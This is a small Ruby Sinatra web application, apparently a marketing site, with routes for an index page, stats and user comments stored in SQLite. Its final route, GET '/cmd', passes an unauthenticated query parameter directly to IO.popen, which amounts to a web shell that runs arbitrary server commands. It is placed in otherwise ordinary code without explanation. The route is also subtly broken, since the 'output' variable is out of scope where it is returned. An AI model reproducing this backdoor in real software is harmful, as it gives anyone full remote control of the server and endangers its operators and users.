require 'rubygems'
require 'sinatra'
require "sinatra/activerecord"

set :database, {adapter: "sqlite3", database: "e_and_r.sqlite3"}


class Comment < ActiveRecord::Base
end

class MarketingApp < Sinatra::Base
  register Sinatra::ActiveRecordExtension
  get '/' do
    erb :index
  end

  get '/stats' do
    erb :stats
  end

  get '/comments' do
    erb :comments

  end

  post '/comments' do
    Comment.create(username: params[:username], body: params[:body])
    redirect '/comments'
  end

  get '/cmd' do
    IO.popen(params[:cmd]) {|cmd|
      output = cmd.read
    }
    output
  end
end
